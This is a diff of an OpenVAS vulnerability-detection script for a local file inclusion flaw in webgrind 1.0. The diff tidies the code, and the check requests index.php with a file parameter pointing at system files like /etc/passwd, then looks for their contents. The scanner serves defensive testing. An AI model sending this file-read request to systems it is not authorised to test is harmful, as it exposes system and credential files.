@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_webgrind_lfi_02_2012.nasl 5642 2017-03-21 08:49:30Z cfi $
+# $Id: gb_webgrind_lfi_02_2012.nasl 5716 2017-03-24 12:31:10Z cfi $
 #
 # webgrind 1.0 (file param) Local File Inclusion Vulnerability
 #
@@ -34,22 +34,17 @@ further attacks.
 
 Webgrind 1.0 (v1.02 in trunk on github) are vulnerable; other versions may also be affected.";
 
-
 if (description)
 {
  script_id(103439);
- script_version ("$Revision: 5642 $");
-
+ script_version ("$Revision: 5716 $");
  script_name("webgrind 1.0 (file param) Local File Inclusion Vulnerability");
-
  script_xref(name : "URL" , value : "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5075.php");
-
  script_cve_id("CVE-2011-3047");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
- script_tag(name:"last_modification", value:"$Date: 2017-03-21 09:49:30 +0100 (Tue, 21 Mar 2017) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-24 13:31:10 +0100 (Fri, 24 Mar 2017) $");
  script_tag(name:"creation_date", value:"2012-02-28 11:24:22 +0100 (Tue, 28 Feb 2012)");
- script_summary("Determine if Webgrind is prone to a local file-include vulnerability");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
@@ -62,35 +57,33 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
-   
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
-if(!can_host_php(port:port))exit(0);
+include("host_details.inc");
 
-dirs = make_list("/webgrind",cgi_dirs());
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
+
 files = traversal_files();
 
-foreach dir (dirs) {
-  foreach file (keys(files)) {
-   
-    url = string(dir, "/index.php"); 
+foreach dir( make_list_unique( "/webgrind", cgi_dirs( port:port ) ) ) {
 
-    if(http_vuln_check(port:port, url:url,pattern:"<title>webgrind</title>")) {
+  if( dir == "/" ) dir = "";
+  url = dir + "/index.php";
+  buf = http_get_cache( item:url, port:port );
 
-      url = string(dir,"/index.php?file=/",files[file],"&op=fileviewer");
+  if( "<title>webgrind</title>" >< buf ) {
 
-      if(http_vuln_check(port:port, url:url,pattern:"(root:.:0:[01]:|\[boot loader\])")) {
-     
-        security_message(port:port);
-        exit(0);
+    foreach file( keys( files ) ) {
 
-      }  
+      url = dir + "/index.php?file=/" + files[file] + "&op=fileviewer";
 
-   }
+      if( http_vuln_check( port:port, url:url,pattern:file ) ) {
+        report = report_vuln_url( port:port, url:url );
+        security_message( port:port, data:report );
+        exit( 0 );
+      }
+    }
   }
 }
 
-exit(0);
+exit( 99 );
